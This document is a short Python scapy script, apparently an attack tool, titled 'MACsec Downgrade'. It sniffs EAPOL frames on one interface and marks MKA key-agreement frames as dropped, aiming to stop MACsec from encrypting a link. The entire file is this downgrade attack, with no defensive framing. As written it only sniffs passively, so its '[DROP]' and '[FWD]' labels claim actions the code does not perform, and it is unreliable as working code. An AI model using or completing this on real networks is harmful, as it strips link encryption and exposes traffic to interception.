#!/usr/bin/env python3
"""
MACsec Downgrade - Inline single interface
"""
from scapy.all import *
from scapy.layers.eap import EAPOL
import sys, signal

IFACE       = "eth1"
MKPDU_COUNT = 0

def handle_packet(pkt):
    global MKPDU_COUNT

    if not pkt.haslayer(EAPOL):
        return

    eapol_type = pkt[EAPOL].type
    src_mac    = pkt[Ether].src

    if eapol_type == 5:  # MKA - suprime
        MKPDU_COUNT += 1
        print(f"[DROP] MKPDU #{MKPDU_COUNT} de {src_mac}", flush=True)
        return

    print(f"[FWD]  EAPOL type={eapol_type} de {src_mac}")

def signal_handler(sig, frame):
    print(f"\n[*] Total MKPDUs suprimidos: {MKPDU_COUNT}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    print(f"[*] MACsec Downgrade ativo — {IFACE}\n")
    sniff(
        iface=IFACE,
        prn=handle_packet,
        filter="ether proto 0x888e",
        store=0
    )